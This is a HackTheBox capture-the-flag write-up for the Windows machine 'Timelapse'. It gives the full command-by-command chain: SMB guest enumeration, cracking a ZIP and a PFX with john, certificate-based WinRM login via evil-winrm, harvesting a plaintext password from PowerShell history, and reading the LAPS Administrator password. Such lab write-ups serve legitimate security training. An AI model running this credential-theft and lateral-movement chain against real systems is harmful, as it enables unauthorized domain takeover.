# Timelapse — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows Server 2019 |
| Difficulty | Easy |
| Active Directory | Yes |
| IP | 10.129.227.113 |
| User flag | checkmark |
| Root flag | checkmark |
| Site writeup | [jostif.pages.dev](https://jostif.pages.dev/writeups/timelapse) |

**Techniques:** SMB guest -> ZIP crack (zip2john) -> PFX crack (pfx2john) -> WinRM via certificate -> PowerShell history -> LAPS read -> Administrator

---

## Summary

SMB guest access exposes a password-protected ZIP containing a PFX certificate. Cracking both gives a WinRM foothold as legacyy. PowerShell history reveals svc_deploy credentials — a member of LAPS_Readers — enabling direct Administrator password retrieval from AD.

**Chain:** SMB guest -> winrm_backup.zip -> PFX crack -> legacyy (WinRM) -> PS History -> svc_deploy -> LAPS_Readers -> Administrator

---

## 01 — Reconnaissance

```bash
nmap -sC -sV -p- --min-rate 5000 -oN nmap_full.txt 10.129.227.113
```

```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
389/tcp   open  ldap           Domain: timelapse.htb
445/tcp   open  microsoft-ds
5986/tcp  open  ssl/wsmans     <- WinRM over SSL (cert-based auth)
clock-skew: mean: 8h00m02s
```

Port 5986 (WinRM/HTTPS) — certificate-based login is possible. HelpDesk share contains LAPS installer and docs.

---

## 02 — SMB Enumeration

```bash
nxc smb 10.129.227.113 -u 'guest' -p '' --shares
# Shares  READ

smbclient //10.129.227.113/Shares
smb: \> cd Dev
smb: \Dev\> get winrm_backup.zip
smb: \> cd HelpDesk
# LAPS.x64.msi, LAPS documentation <- LAPS is deployed
```

---

## 03 — Cracking the ZIP

```bash
zip2john winrm_backup.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
# supremelegacy  (winrm_backup.zip/legacyy_dev_auth.pfx)

unzip -P supremelegacy winrm_backup.zip
# legacyy_dev_auth.pfx <- filename leaks username: legacyy
```

---

## 04 — Cracking the PFX

```bash
pfx2john legacyy_dev_auth.pfx > pfx.hash
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
# thuglegacy
```

---

## 05 — WinRM as legacyy

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy.key -passin pass:thuglegacy
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legacyy.crt -passin pass:thuglegacy

evil-winrm -i 10.129.227.113 -S -c legacyy.crt -k legacyy.key
type C:\Users\legacyy\Desktop\user.txt
```

**User flag obtained.**

---

## 06 — PowerShell History

```powershell
type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
# $c = New-Object System.Management.Automation.PSCredential ('timelapse.htb\svc_deploy', $p)
```

**Credentials:** `svc_deploy : E3R$Q62^12p7PLlC%KWaxuaV`

---

## 07 — LAPS Read

```bash
evil-winrm -i 10.129.227.113 -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'

Get-ADComputer DC01 -Properties ms-Mcs-AdmPwd | Select-Object ms-Mcs-AdmPwd
# ms-Mcs-AdmPwd: <admin_password>

evil-winrm -i 10.129.227.113 -S -u Administrator -p '<admin_password>'
type C:\Users\TRX\Desktop\root.txt
```

**Root flag obtained.**

---

## Key takeaways

- Port 5986 (WinRM/HTTPS) accepts certificate auth — PFX files in SMB are high-value
- PowerShell history (`ConsoleHost_history.txt`) is the first thing to check post-foothold
- LAPS_Readers group membership -> direct Administrator password read from AD attribute `ms-Mcs-AdmPwd`
- `zip2john` + `pfx2john` are essential for cracking protected archives and certificates
